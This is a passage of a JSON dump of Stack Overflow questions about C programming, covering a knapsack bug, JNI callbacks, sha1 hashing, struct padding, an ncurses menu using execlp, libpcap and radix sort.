WEIGHTS OF THE ITEMS:\");\n    for(i=1;i&lt;=n;i++)\n        scanf(\"%d\",&amp;w[i]);\n    printf(\"ENTER THE PROFITS OF THE ITEMS:\");\n    for(i=1;i&lt;=n;i++)\n        scanf(\"%d\",&amp;p[i]);\n    printf(\"ENTER THE CAPACITY OF KNAPSACK:\");\n    scanf(\"%d\",&amp;m);\n    knapsack(m,n,w,p);\n    return 0;\n}\n</code></pre>\n\n<p>SAMPLE OUTPUT:</p>\n\n<p>chaitanya@chaitanya-laptop:~/Desktop/My prog$ ./a.out</p>\n\n<p>ENTER THE NUMBER OF ITEMS:5</p>\n\n<p>ENTER THE WEIGHTS OF THE ITEMS:3\n2\n1\n2\n3</p>\n\n<p>ENTER THE PROFITS OF THE ITEMS:2\n3\n2\n3\n2</p>\n\n<p>ENTER THE CAPACITY OF KNAPSACK: 8</p>\n\n<p>0   -72 -1080992920 -72 0   1   -1080993280 0   13403040<br>\n0   -72 -1080992920 2   0   1   -70 2   13403040<br>\n0   -72 3   2   0   5   3   4   13403040<br>\n0   2   3   5   4   5   7   5   13403040<br>\n0   2   3   5   6   8   7   8   13403040<br>\n0   2   3   5   6   8   7   8   13403040    </p>\n\n<p>THE OPTIMAL SOLUTION IS:13403040</p>\n\n<p>THE OPTIMAL SET OF WEIGHTS IS:</p>\n\n<p><strong>Note: The same program produces a legitimate output for the same input when compiled in the TURBOC compiler.</strong></p>\n\n<p>So that leads me to believe that i am not adhering to C standards. Is that so?</p>\n"},{"tags":["java","c","jni","jnienv"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":279,"score":5,"question_id":10895826,"title":"what is wrong with this call to the java method?","body":"<p>I am trying to call a Java method from the code. C code listens to either <code>Escape</code>, <code>Shift</code>, <code>Ctrl</code> key press, then it calls the Java method telling which key was pressed. Following are the snippets that play a role in this.</p>\n\n<p><em>C Snippet:</em></p>\n\n<pre><code>mid = (*env)-&gt;GetMethodID(env,cls,\"callBack\",\"(Ljava/lang/String;)V\");\nEnv = env;\nif(called)\n    switch(param) {\n        case VK_CONTROL:\n            printf(\"Control pressed !\\n\");\n            (*Env)-&gt;CallVoidMethodA(Env,Obj,mid,\"11\"); // calling the java method\n            break;\n        case VK_SHIFT:\n            printf(\"Shift pressed !\\n\");\n            (*Env)-&gt;CallVoidMethodA(Env,Obj,mid,\"10\"); // calling the java method\n            break;\n        case VK_ESCAPE:\n            printf(\"Escape pressed !\\n\");\n            (*Env)-&gt;CallVoidMethodA(Env,Obj,mid,\"1B\"); // calling the java method\n            break;\n        default:\n            printf(\"The default case\\n\");\n            break;\n    }\n</code></pre>\n\n<p><em>Java Snippet:</em></p>\n\n<pre><code>public void callBack(String key) {\n    String x = KeyEvent.getKeyText(Integer.parseInt(key, 16));\n    System.out.println(x);\n}\n</code></pre>\n\n<p>When I run the program and press the <code>Escape</code> key I get this on the console:</p>\n\n<pre><code>Escape pressed !\n#\n# A fatal error has been detected by the Java Runtime Environment:\n#\n#  EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x5c8b809a, pid=7588, tid=8088\n#\n# JRE version: 7.0\n# Java VM: Java HotSpot(TM) Client VM (20.0-b01 mixed mode, sharing windows-x86 )\n# Problematic frame:\n# V  [jvm.dll+0x19809a]\n#\n# An error report file with more information is saved as:\n# W:\\UnderTest\\NetbeansCurrent\\KeyLoggerTester\\build\\classes\\hs_err_pid7588.log\n#\n# If you would like to submit a bug report, please visit:\n#   http://java.sun.com/webapps/bugreport/crash.jsp\n#\n</code></pre>\n\n<p>I know I am calling the Java function the wrong way, but I don't know where I am wrong. As from the output, it satisfies the case when I press the <code>Escape</code> key and then an unexpected error occurs.</p>\n\n<p><a href=\"http://suhail03.my3gb.com/hs_err_pid7852.log\" rel=\"nofollow\"><em>Link to the LOG FILE</em></a></p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>After the answer by <a href=\"http://stackoverflow.com/users/89435/mavroprovato\">mavroprovato</a> I still get the same errors.</p>\n\n<p>I edited this way: </p>\n\n<pre><code>(*Env)-&gt;CallVoidMethodA(Env,Obj,mid,(*Env)-&gt;NewStringUTF(Env,\"1B\"));\n</code></pre>\n\n<p><strong>EDIT:</strong></p>\n\n<h2><a href=\"http://programworks.co.cc/complete%20code.html\" rel=\"nofollow\">COMPLETE CODE version 1</a></h2>\n\n<h2><a href=\"http://programworks.co.cc/bummers/crash.html\" rel=\"nofollow\">COMPLETE CODE version 2</a></h2>\n"},{"tags":["c","gcc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13263303,"title":"Get the included path in same program","body":"<p>Suppose I have a program</p>\n\n<p><strong>main.c</strong></p>\n\n<pre><code>#include \"file.h\" \n#include &lt;stdio.h&gt;\nint main()\n{\n//Code to found the included path\n}\n\ngcc -I /local main.c\n</code></pre>\n\n<p>How can I found the included path of header file inside this program\nNow their can be 3 included path</p>\n\n<ol>\n<li>current directory</li>\n<li>ENV set in the Path VARIABLE or other</li>\n<li>Directory included with -I option</li>\n</ol>\n\n<p>Please provide a way to get this inside the same program. </p>\n"},{"tags":["java","c","multithreading","jni"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1855,"score":2,"question_id":453776,"title":"How to: Java listening for events captured by C thread","body":"<p>I would like to create a Java program to listen for and respond to events captured by a thread in C.<br>\nCan someone explain how this can be achieved using JNI, or point me to online tutorials?</p>\n\n<p>Thank you.</p>\n"},{"tags":["c","sha","g-wan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13254000,"title":"G-wan C Sha1 hashing","body":"<p>I'm having a small issue getting the sha1 function to work in G-WAN.</p>\n\n<p>Basically i have the string i want to hash, I'm new to C in general so any pointers would be\ngreat.</p>\n\n<p>This is the string im trying to sha1 hash, I'v tried several approaches but I'm not sure what I'm doing wrong.</p>\n\n<pre><code>u8 *input = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n</code></pre>\n\n<p>I almost have websockets working with G-wan and the last thing is getting this sha1 function to cooperate with me.</p>\n\n<p>Documentation on G-wans sha1 function is below </p>\n\n<pre><code>// u8 dst[20]; // the resulting 160-bit hash\n// sha1_t ctx;\n// sha1_init(&amp;ctx);\n// int i = 10;\n// while(i--)\n//    sha1_add(&amp;ctx, data[i].ptr, data[i].len);\n// sha1_end(&amp;ctx, dst);\n\ntypedef struct { u8 x[220]; } sha1_t;\nvoid sha1_init(sha1_t *ctx);\nvoid sha1_add (sha1_t *ctx, u8 *src, int srclen);\nvoid sha1_end (sha1_t *ctx, u8 *dst);\n// a wrapper on all the above SHA-160 calls\nvoid sha1(u8 *input, int ilen, u8 *dst);\n</code></pre>\n\n<p>Link to there api <a href=\"http://gwan.com/api\" rel=\"nofollow\">http://gwan.com/api</a></p>\n\n<p>If anyone could throw me a bone here It would make my last hours with C a tad bit forgiving.</p>\n"},{"tags":["iphone","objective-c","c","views"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":7768822,"title":"SIGABRT when switching views Objective C","body":"<pre><code>-(IBAction)enterVeryBasics:(id)sender {\n  VeryBasics *enterIntro = [[VeryBasics alloc]initWithNibName:Nil bundle:Nil];\n  [self presentModalViewController:enterIntro animated:YES];\n  [enterIntro release];\n}\n</code></pre>\n\n<p>I have this code here, and on <code>[self presentModalViewController:enterIntro animated:YES];</code> it's giving me a SIGABRT</p>\n\n<p>I have multiple other actions in the same .m file, but they aren't having the same problem.</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":1,"view_count":69,"score":-1,"question_id":13264876,"title":"size of file is not displaying in c","body":"<p>I am trying to get size of a file in c but my code isn't displaying any output with file size. Here is my code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;fcntl.h&gt;\n#include&lt;io.h&gt;\n#include&lt;BIOS.H&gt;\n#include&lt;DOS.H&gt;\n\nunsigned int handle;\nvoid main()\n{\n    union REGS regs;\n    unsigned long int size;\n    handle = open(\"c:\\\\abc.txt\",O_RDONLY);\n    regs.x.bx = handle;\n    regs.h.ah = 0x42;\n    regs.h.al = 0x02;    //correction\n    regs.x.cx = 0;\n    regs.x.dx = 0;\n    int86(0x21,&amp;regs,&amp;regs);\n    *((int*)(&amp;size)) = regs.x.ax;\n    *(((int*)(&amp;size))+1) =regs.x.dx;\n    printf (\"Size is %d\" ,size);\n}\n</code></pre>\n\n<p>Can someone please tell me why the output is not showing</p>\n"},{"tags":["c","64bit","padding"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13264215,"title":"64 bit alignment/padding for c structure?","body":"<pre><code>struct tag_t_ {\n    u_int8_t op;\n    u_int8_t num;\n    u_int32_t labels[5];\n};\n</code></pre>\n\n<p>In the above structure where will be pad bytes added by 64-bit compiler? <br/>\nIs it before the first label or at the end of first label?<br/>\nIf the padding is at end of the first label, Will it cause any erroneous result while accessing (reading) the first label in 32 bit archs?</p>\n"},{"tags":["c","sqlite3","lua","luasql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12236032,"title":"Lua: how to embed luasql.sqlite3 in a C program(statically linked)?","body":"<p>luasql.sqlite3 module has been compiled into my C program successfully, statically linked. But, It seems the module has not been registered yet. The call of \"require 'luasql.sqlite3'\" always fails in Lua scripts.  Some other modules call luaL_register function to register itself. But luaL_register is not called in luaopen_luasql_sqlite3 function. How to register luasql.sqlite3 in this case? I use Lua-5.1.5.</p>\n\n<p><a href=\"https://github.com/LuaDist/luasql-sqlite3/blob/master/src/ls_sqlite3.c\" rel=\"nofollow\">The source code of luaopen_luasql_sqlite3 is at the bottom</a></p>\n"},{"tags":["c","string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13264543,"title":"Horrible strlcat bug or hidden genius?","body":"<p>I am stuck fixing some legacy RAID code (Yes, I pulled the shortest straw).</p>\n\n<p>Heres a snippet of code I found.</p>\n\n<pre><code>#define FLAG_LENGTH 256\n\n#code\nchar str[FLAG_LENGTH-1]\n\nstrlcat(&amp;str,source_ptr,FLAG_LENGTH);\n</code></pre>\n\n<p>There is comment right above the str declaration which says the size was 1 less for a good reason, but the generous comment writer hasnt mentioned the \"good reason\".</p>\n\n<p>If I understand the implementation of strlcat correctly, it NULL terminates all strings no matter what,and as size if 256 would add it to the 256th character i.e index 255, of a string of size 255, i.e last index 254. Arent we overflowing the string?? Or is there some hidden genius in doing this (Asking purely based on the comment)</p>\n"},{"tags":["c","exec","vlc","amr"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":13,"score":-1,"question_id":13264542,"title":"How to play .amr file in C","body":"<p>I am writing a simple code in C to play a sound file of .amr format.\nI have understood the code of playing mp3 files via mpg123 from execlp command.\nIn that my command looks like this.</p>\n\n<pre><code>execlp(\"mpg123\", \"mpg123\", \"-q\", \"song.mp3\", 0);\n</code></pre>\n\n<p>I tried it with vlc player, but it is opening vlc media player. My command looks like this.</p>\n\n<pre><code>execlp(\"vlc\", \"vlc\", \"song.amr\", 0);\n</code></pre>\n\n<p>I want the .amr file to be played without opening vlc media player. The sound should come from without any visible players like how the first command does.\n   Or is it possible to make the vlc media player work from background without appearing.</p>\n\n<p>Please can anyone help me with this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c","voice"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":12,"score":-2,"question_id":13264440,"title":"Where can I find Pocketsphinx tutorials?","body":"<p>so I recently tried using Pocketsphinx voice recognition for my project, but I can't find any documentation or examples of it being used in C or C++, or almost none at all. Does anyone know where I can find this?</p>\n"},{"tags":["c","ncurses"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13264391,"title":"getting trouble with execlp()","body":"<p>I am using execlp to implement a net based command but its not working.I am using </p>\n\n<pre><code>execlp(\"telnet 0 5000\",\"telnet 0 5000\",(char *)NULL);\ndelwin(menubar);\ndelwin(messagebar);\nendwin();\n</code></pre>\n\n<p>but its not working else than that if i replace telnet 0 5000 with ls it will work but the output comes on the same screen means on the GUI and noecho get activates automatically and output of ls comes in a pretty unusual manner.</p>\n\n<p>below is my full code .</p>\n\n<pre><code>#include &lt;curses.h&gt;\n#include &lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n\n#define ENTER 10\n#define ESCAPE 27\nvoid init_curses()\n{\n        initscr();\n        start_color();\n        init_pair(1,COLOR_WHITE,COLOR_\nBLUE);\n        init_pair(2,COLOR_BLUE,COLOR_WHITE);\n        init_pair(3,COLOR_RED,COLOR_WHITE);\n        curs_set(0);\n        //noecho();\n        keypad(stdscr,TRUE);\n}\nvoid draw_menubar(WINDOW *menubar)\n{\n        wbkgd(menubar,COLOR_PAIR(2));\n        waddstr(menubar,\"PARALLEL\");\n        wattron(menubar,COLOR_PAIR(3));\n        waddstr(menubar,\"CON.\");\n        wattroff(menubar,COLOR_PAIR(3));\n        wmove(menubar,0,20);\n        waddstr(menubar,\"SERIAL\");\n        wattron(menubar,COLOR_PAIR(3));\n        waddstr(menubar,\"CON.\");\n        wattroff(menubar,COLOR_PAIR(3));\n}\nWINDOW **draw_menu(int start_col)\n{\n\n        WINDOW **items;\n        items=(WINDOW **)malloc(9*sizeof(WINDOW *));\n\n        items[0]=newwin(10,19,1,start_col);\n        wbkgd(items[0],COLOR_PAIR(2));\n        box(items[0],ACS_VLINE,ACS_HLINE);\n        items[1]=subwin(items[0],1,17,2,start_col+1);\nwprintw(items[1],\"Shailendra singh\",1);\n        items[2]=subwin(items[0],1,17,3,start_col+1);\nwprintw(items[2],\"THIVNENT TECH\",2);\n        items[3]=subwin(items[0],1,17,4,start_col+1);\nwprintw(items[3],\"THINCLIENT\",3);\n        items[4]=subwin(items[0],1,17,5,start_col+1);\nwprintw(items[4],\"SOLARCOMPUTING\",4);\n        items[5]=subwin(items[0],1,17,6,start_col+1);\nwprintw(items[5],\"TECHNOCRATS\",5);\n        items[6]=subwin(items[0],1,17,7,start_col+1);\nwprintw(items[6],\"SENSORS\",6);\n        items[7]=subwin(items[0],1,17,8,start_col+1);\nwprintw(items[7],\"NCURSESLIB\",7);\n        items[8]=subwin(items[0],1,17,9,start_col+1);\nwprintw(items[8],\"GCC COMPILER\",8);\n\n\n\n\n\n        wbkgd(items[1],COLOR_PAIR(1));\n        wrefresh(items[0]);\n        return items;\n}\n\nvoid write_data0()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\n if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1;  }\n if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.0 \\n\", fp);\nfputs(\"Server type = R \",ft); \nfclose(ft);\nfclose(fp); \n}\nvoid write_data1()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\n if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1; }\n  if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                 return 1;}\nfputs(\"172.16.254.1 \\n\", fp); \nfputs(\"Server type = T \",ft); \nfclose(ft);\nfclose(fp); \n}\n\nvoid write_data2()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\");  \n ft = fopen(\"servertype.txt\",\"w\");\nif(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                return 1;}\nif(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\n\nfputs(\"172.16.254.2 \\n\", fp); \nfputs(\"Server type = C \",ft); \nfclose(ft);\nfclose(fp); \n}\n\nvoid write_data3()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\n if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1; }\n  if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.3 \\n\", fp);\nfputs(\"Server type = R \",ft); \nfclose(ft);\nfclose(fp); \n}\n\nvoid write_data4()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\nif(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1;}\n if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.4 \\n\", fp); \nfputs(\"Server type = T \",ft); \nfclose(ft);\nfclose(fp); \n}\nvoid write_data5()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\nif(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1; }\n if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.5 \\n\", fp);\nfputs(\"Server type = C \", ft); \nfclose(ft); \nfclose(fp); \n}\nvoid write_data6()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\nif(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                 return 1;}\n if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.6 \\n\", fp); \nfputs(\"Server type = R \",ft); \nfclose(ft);\nfclose(fp); \n}\nvoid write_data7()\n{FILE *fp,*ft;\n fp = fopen(\"file.txt\", \"w\"); \n ft = fopen(\"servertype.txt\",\"w\");\nif(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n                return 1; }\n if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n                return 1; }\nfputs(\"172.16.254.7 \\n\", fp); \nfputs(\"Server type = T \",ft); \nfclose(ft);\nfclose(fp);\n}\n\n\nWINDOW **draw_menu1(int start_col)\n{\n\n        WINDOW **items;\n        items=(WINDOW **)malloc(9*sizeof(WINDOW *));\n\n        items[9]=newwin(10,19,1,start_col);\n        wbkgd(items[9],COLOR_PAIR(2));\n        box(items[9],ACS_VLINE,ACS_HLINE);\n        items[1]=subwin(items[9],1,17,2,start_col+1);\nwprintw(items[1],\"SHAILENDRA SINGH\",1);\n        items[2]=subwin(items[9],1,17,3,start_col+1);\nwprintw(items[2],\"thivnent tech\",2);\n        items[3]=subwin(items[9],1,17,4,start_col+1);\nwprintw(items[3],\"THINCLIENT\",3);\n        items[4]=subwin(items[9],1,17,5,start_col+1);\nwprintw(items[4],\"SOLARCOMPUTING\",4);\n        items[5]=subwin(items[9],1,17,6,start_col+1);\nwprintw(items[5],\"TECHNOCRATS\",5);\n        items[6]=subwin(items[9],1,17,7,start_col+1);\nwprintw(items[6],\"SENSORS\",6);\n        items[7]=subwin(items[9],1,17,8,start_col+1);\nwprintw(items[7],\"NCURSESLIB\",7);\n        items[8]=subwin(items[9],1,17,9,start_col+1);\nwprintw(items[8],\"GCC COMPILER\",8);\n\n\n\n\n\n        wbkgd(items[1],COLOR_PAIR(1));\n        wrefresh(items[9]);\n        return items;\n}\nvoid delete_menu(WINDOW **items,int count)\n{\n        int i;\n        for (i=0;i&lt;count;i++)\n                delwin(items[i]);\n        free(items);\n}\nint scroll_menu(WINDOW **items,int count,int menu_start_col)\n{\n        int key;\n        int selected=0;\n        while (1) {\n                key=getch();\n                if (key==KEY_DOWN || key==KEY_UP) {\n                        wbkgd(items[selected+1],COLOR_PAIR(2));\n                        wnoutrefresh(items[selected+1]);\n                        if (key==KEY_DOWN) {\n                                selected=(selected+1) % count;\n                        } else {\n                                selected=(selected+count-1) % count;\n                        }\n                        wbkgd(items[selected+1],COLOR_PAIR(1));\n                        wnoutrefresh(items[selected+1]);\n                        doupdate();\n                } else if (key==KEY_LEFT || key==KEY_RIGHT) {\n                        delete_menu(items,count+1);\n                        touchwin(stdscr);\n                        refresh();\n                        items=draw_menu(20-menu_start_col);\n                        return scroll_menu(items,8,20-menu_start_col);\n                } else if (key==ESCAPE) {\n                        return -1;\n                } else if (key==ENTER) {\n                        return selected;\n                }\n        }\n}\nint main()\n{\n    int key;\n    WINDOW *menubar,*messagebar;\n\n    init_curses();\n\n    bkgd(COLOR_PAIR(1));\n    menubar=subwin(stdscr,1,80,0,0);\n    messagebar=subwin(stdscr,1,79,23,1);\n    draw_menubar(menubar);\n    move(2,1);\n    printw(\"Press F1 or F2 to open the menus. \");\n    printw(\"ESC quits.\");\n    refresh();\n\n    do {\n        int selected_item;\n        WINDOW **menu_items;\n        key=getch();\n        werase(messagebar);\n        wrefresh(messagebar);\n        if (key==KEY_F(1)) {\n            menu_items=draw_menu(0);\n            selected_item=scroll_menu(menu_items,8,0);\n            delete_menu(menu_items,9);\n            if (selected_item&lt;0)\n                wprintw(messagebar,\"You haven't selected any item.\");\n            else if(selected_item==0){\n                wprintw(messagebar,\"You have selected menu SHAILENDRA SINGH.\",1);\nwrite_data0();\nif(fork())\nwait(0);\nelse\nexeclp(\"clear\",\"clear\",(char *)NULL);\nexeclp(\"ls\",\"ls\",(char *)NULL);\nexeclp(\"konsole\",\"konsole\",(char *)NULL);\nESCAPE;\nrefresh();\ndelwin(menubar);\ndelwin(messagebar);\n\nendwin();\n}\n            else if(selected_item==1){\n                wprintw(messagebar,\"You have selected menu THINVENT TECH.\",2);\nwrite_data1();\n}\n            else if(selected_item==2){\n                wprintw(messagebar,\"You have selected menu THINCLIENT.\",3);\nwrite_data2();\n}\n            else if(selected_item==3){\n                wprintw(messagebar,\"You have selected menu SOLAR COMPUTING\",4);\nwrite_data3();\n}\n            else if(selected_item==4){\n                wprintw(messagebar,\"You have selected menu TECHNOCRATS.\",5);\nwrite_data4();\n}\n            else if(selected_item==5){\n                wprintw(messagebar,\"You have selected menu SENSORS.\",6);\nwrite_data5();\n}\n            else if(selected_item==6){\n                wprintw(messagebar,\"You have selected menu NCURSESLIB.\",7);\nwrite_data6();\n}\n            else if(selected_item==7){\n                wprintw(messagebar,\"You have selected menu GCCCOMPILER.\",8);\nwrite_data7();\n}          \n\n            touchwin(stdscr);\n            refresh();\n        }\nelse if (key==KEY_F(2)) {\n            menu_items=draw_menu1(20);\n            selected_item=scroll_menu(menu_items,8,20);\n            delete_menu(menu_items,9);\n            if (selected_item&lt;0)\n                wprintw(messagebar,\"You haven't selected any item.\");\n            else\n                wprintw(messagebar,\n                  \"You have selected menu item %d.\",selected_item+1);\n            touchwin(stdscr);\n            refresh();\n        }}\n    while (key!=ESCAPE);\n    delwin(menubar);\n    delwin(messagebar);\n\n    endwin();\n    return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","memory","struct"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13263745,"title":"Define structure for network communication in C","body":"<p>I want to define a structure in C for network transferring, for example I want to transfer an Animal structure, which contains a variable length of animal name.</p>\n\n<p>AFAIK, one way is <code>using a predefined length of char array</code>, or <code>using a buffer</code> in the struct, and we can parse the buffer <i>(e.g., the first 4 bytes are the animal name length, followed by the animal name, and other fields' length and other fields' values)</i>, the advantage of the latter method is that it allows variable name length, as following code indicates:</p>\n\n<pre><code>struct Animal\n{\n    char   name[128];\n    int    age;\n}\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>struct Animal\n{\n    int    bufferLen;\n    char*  pBuffer;\n}\n</code></pre>\n\n<p>My question is: are my approaches correct? i.e., there are the standard ways to transfer struct, and are there better ways?</p>\n\n<p>My second question is: do I need to pay attention to paddding, i.e., use <code>#pragma pack(push/pop, n)</code>?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["c++","c","network-programming","ubuntu-12.04","libpcap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":23,"score":-1,"question_id":13261105,"title":"Capturing UDP datagrames using libpcaps lib","body":"<p>How can I programming capture all UDP dategrams from some IP using libpcaps library in Ubuntu 12.04. I'll\nbe very glad to see short simple example.</p>\n"},{"tags":["c","compiler-errors","undefined"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":42,"score":-2,"question_id":13263716,"title":"C programming - \"Undefined symbol referenced in file\"","body":"<p>I am trying to write a program to approximate pi. It basically takes random points between 0.00 and 1.00 and compares them to the bound of a circle, and the ratio of points inside the circle to total points should approach pi (A very quick explanation, the specification goes in depth much more).</p>\n\n<p>However, I am getting the following error when compiling with gcc:</p>\n\n<pre><code>Undefined                       first referenced\nsymbol                          in file\npow                             /var/tmp//cc6gSbfE.o\nld: fatal: symbol referencing errors. No output written to a.out\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>What is happening with this? I've never seen this error before, and I don't know why it's coming up. Here is my code (though I haven't fully tested it since I can't get past the error):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nint main(void) {\n    float x, y;\n    float coordSquared;\n    float coordRoot;\n    float ratio;\n    int n;\n    int count;\n    int i;\n\n    printf(\"Enter number of points: \");\n    scanf(\"%d\", &amp;n);\n\n    srand(time(0));\n\n    for (i = 0; i &lt; n; i++) {\n        x = rand();\n        y = rand();\n\n        coordSquared = pow(x, 2) + pow(y, 2);\n        coordRoot = pow(coordSquared, 0.5);\n\n        if ((x &lt; coordRoot) &amp;&amp; (y &lt; coordRoot)) {\n            count++;\n        }\n    }\n\n    ratio = count / n;\n    ratio = ratio * 4;\n\n    printf(\"Pi is approximately %f\", ratio);\n\n    return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","gcc","codeblocks"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":547,"score":0,"question_id":6365014,"title":"Fixing #includes <> for GCC (Code::Blocks)","body":"<p>I am working with some code that was written for a different compiler/linker, and it is including files like this:</p>\n\n<pre><code>#include &lt;Engine/Graphics/Sprite.h&gt;\n</code></pre>\n\n<p>from anywhere in the project.</p>\n\n<p>The project contains such a file at that path (from the root of the project), but when I build I get the file not found error.</p>\n\n<p>How can I fix all of these includes, without going through and doing it all manually?</p>\n"},{"tags":["c","xcode","file","static"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":26,"score":3,"question_id":13261597,"title":"Using static libraries on a C project in XCode 4.5.2","body":"<p>I'm new to Xcode so not really keen on it yet. In my college is used visual studio to program in C in which they create a solution and fill it with an application and then include static libraries with .h and .c files. Been trying to do this in Xcode but can't seem to include them or add dependencies like in Visual Studio</p>\n"},{"tags":["c","visual-studio","visual-studio-2008","visual-c++"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1744,"score":3,"question_id":6895457,"title":"how to define relative paths in Visual Studio Project?","body":"<p>I know this question has been asked before. I read the answer but did not get cleared. \nI have a library and I made a console application that uses that library. library have my folder that have source and header files.\nmy project is in inner directory but some of folders that I want to include are in upper directory like this.</p>\n\n<p>my project directory:</p>\n\n<pre><code>H:\\Gmail_04\\gsasl-1.0\\lib\\libgsaslMain\n</code></pre>\n\n<p>some includes files are here:</p>\n\n<pre><code>H:\\Gmail_04\\gsasl-1.0\\src\n</code></pre>\n\n<p>how can I include relative paths of these folder that are in upper directory relative to the project directory?\nThanks</p>\n"},{"tags":["c++","c","algorithm","palindrome"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":706,"score":1,"question_id":11925840,"title":"How to calculate nth n-digit palindrome efficiently?","body":"<p>I think the question is simple enough to understand.For more clarity I'm giving example :</p>\n\n<p><strong>In the list of 2 digit palindromes, the 7th palindrome is 77 (1st being 11, 2nd being 22 and so on).</strong></p>\n\n<p>Obviously a brute force solution exists but it's not efficient.</p>\n\n<p>Can anyone suggest me some better solution to solve the problem ?</p>\n"},{"tags":["c","linked-list","queue","radix-sort"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":346,"score":5,"question_id":12751815,"title":"Radix Sorting with using queue","body":"<p>I've wanted to create a <a href=\"http://en.wikipedia.org/wiki/Radix_sort\" rel=\"nofollow\">radix sort</a> implementation using queues. </p>\n\n<p>I couldn't figure out which part of my code has problems or which resources should I read.\nMy code may be totally wrong but this is my implementation without any help (I haven't taken a data structures &amp; algorithms course yet). </p>\n\n<p>I created a function but it didn't work. While doing research, I saw some code samples but they seemed to be more complex for me.</p>\n\n<p><strong>Firstly</strong> I wanted to find the least significant digit of all integers \n<strong>Then</strong> sort them in queue element whose subscript matches, \n<strong>then</strong> after sort copy all queues to end of 11th queue element. \nDo this sort in 11th queue element again until reach most significant digit.</p>\n\n<p>I could find least significant digit. And sort according to this digit. But, I couldn't analyse other digits. For instance;\nI could sort 1, 2 , 4, 5, 3 but when time comes to sort 2 or more digits, it fails...</p>\n\n<p>I hope, I was clear and explained my problem briefly.</p>\n\n<pre><code>// My function declaration\n// Pre: arrInts holds the linked list of integers which are going to be sort.\n// Post: queue will return result and its 11th element should hold 